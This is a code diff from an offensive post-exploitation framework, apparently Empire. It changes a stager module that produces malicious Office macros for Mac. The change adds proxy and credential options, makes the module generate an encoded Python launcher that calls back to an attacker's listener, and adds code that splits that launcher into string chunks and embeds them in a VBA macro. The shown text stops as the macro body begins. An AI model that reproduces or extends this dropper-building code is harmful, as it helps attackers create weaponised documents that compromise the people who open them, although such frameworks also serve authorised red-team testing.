@@ -64,9 +64,9 @@ class Stager:
             holder = []
             str1 = ''
             str2 = ''
-            str1 = varstr + ' = "' + instr[:54] + '"' 
+            str1 = varstr + ' = "' + instr[:54] + '"'
             for i in xrange(54, len(instr), 48):
-                holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+48])
+                holder.append('\t\t' + varstr + ' = '+ varstr +' + "'+instr[i:i+48])
                 str2 = '"\r\n'.join(holder)
             str2 = str2 + "\""
             str1 = str1 + "\r\n"+str2
@@ -76,19 +76,23 @@ class Stager:
         language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
+        proxy = self.options['Proxy']['Value']
+        proxyCreds = self.options['ProxyCreds']['Value']
+        stagerRetries = self.options['StagerRetries']['Value']
         safeChecks = self.options['SafeChecks']['Value']
+        pixelTrackURL = self.options['PixelTrackURL']['Value']
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)
+        # generate the python launcher code
+        pylauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)
 
-        if launcher == "":
-            print helpers.color("[!] Error in launcher command generation.")
+        if pylauncher == "":
+            print helpers.color("[!] Error in python launcher command generation.")
             return ""
 
-        else:
-            launcher = launcher.replace("\"", "\"\"")
-            for match in re.findall(r"'(.*?)'", launcher, re.DOTALL):
-                payload = formStr("cmd", match)
+        # render python launcher into python payload
+        pylauncher = pylauncher.replace("\"", "\"\"")
+        for match in re.findall(r"'(.*?)'", pylauncher, re.DOTALL):
+            payload = formStr("str", match)
 
             macro = """
 #If Mac Then
